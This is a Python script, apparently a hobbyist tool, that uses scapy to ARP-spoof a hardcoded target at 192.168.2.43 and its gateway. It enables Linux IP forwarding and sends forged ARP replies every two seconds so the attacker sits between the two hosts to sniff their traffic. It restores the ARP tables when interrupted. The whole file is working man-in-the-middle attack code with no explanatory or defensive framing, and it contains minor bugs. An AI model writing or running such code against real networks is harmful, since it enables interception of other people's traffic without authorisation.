import scapy.all as scapy
import time
from datetime import datetime


############### Manually
#print("Enter Router's ip")
#gateway_ip=str(input())[2:]
#print("\n[+] Enter target IP(PDC to be spoofed):")
#source_ip=input()
source_ip="192.168.2.43"
print("Spoofing IP:",source_ip)
############### Extract from system
gateway_ip = scapy.conf.route.route("0.0.0.0")[2]  #getting gateway ip from networking
gateway_mac = scapy.getmacbyip(gateway_ip)         #getting gateway mac add for spoofing router on the other end in first step
source_mac=scapy.getmacbyip(source_ip)
print(gateway_ip)
print(gateway_mac)
#Function to turn on ip forwarding
def _enable_linux_iproute():
    """
    Enables IP route ( IP Forward ) in linux-based distro
    """
    file_path = "/proc/sys/net/ipv4/ip_forward"
    print("Turning IP-Forwarding on:........\n") 
    with open(file_path) as f:
        if f.read() == 1:
            # already enabled
            print("IP forwarding is already on\nProceeding to sniff the traffic\n")
            return
    with open(file_path, "w") as f:
        print(1, file=f)
        print("IP-Forwarding is on now:\nProceeding to sniff the traffic\n") 
####################

def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = source_mac, psrc = spoof_ip)
    scapy.send(packet, verbose = False)
  
#####################
def restore(destination_ip, source_ip,verbose=True):
    destination_mac = gateway_mac
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, verbose = True)
    if verbose:
        print("[+] Sent to {} : {} is-at {}".format(source_ip, destination_ip, gateway_mac))  
####################


# GAme
_enable_linux_iproute()  
sent_packets_count=0

try:
    while True:
        spoof(source_ip, gateway_ip)
        spoof(gateway_ip, source_ip)
        sent_packets_count = sent_packets_count + 2
        print("\r[*] Packets Sent "+str(sent_packets_count), end ="")
        time.sleep(2) # Waits for two seconds

except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip,source_ip)
    restore(source_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")
